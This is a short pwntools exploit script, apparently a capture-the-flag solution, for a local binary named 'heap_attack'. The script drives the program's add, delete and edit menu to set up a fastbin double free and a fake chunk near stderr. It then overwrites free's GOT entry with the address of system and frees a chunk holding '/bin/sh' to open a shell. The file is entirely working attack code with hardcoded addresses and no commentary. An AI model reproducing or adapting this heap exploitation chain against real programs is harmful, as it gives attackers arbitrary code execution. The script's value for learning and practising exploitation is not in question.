from pwn import *

context.log_level='debug'

p= process("./heap_attack")

def add(content,size):
	p.recvuntil("choice:")
	p.sendline("1")
	p.recvuntil("size:")
	p.sendline(str(size+1))
	p.recvuntil("content:")
	p.sendline(content)
def _delete(index):
	p.recvuntil("choice:")
	p.sendline("2")
	p.recvuntil("index:")
	p.sendline(str(index))
def edit(index,content):
	p.recvuntil("choice:")
	p.sendline("3")
	p.recvuntil("index:")
	p.sendline(str(index))
	p.recvuntil("content:")
	p.sendline(content)
	p.recvuntil("edit.")

sys_addr = 0x4009B0
stderr_addr = 0x6020c0
free_got = 0x602018

add("hack by 0gur1",100)#0
add("hack by 0gur2",100)#1
add("/bin/sh",256)#2


_delete(0)
_delete(1)
_delete(0)


add(p64(stderr_addr-3),100)#3->0
add('b',100)#4->1
add('c',100)#5->0
add('6'*19+p64(free_got),100)#6->fake fastbin

edit(0,p64(sys_addr)[:6])#'\xb0\x09\x40\x00\x00\x00')

#add("a",20)

_delete(2)
p.interactive()



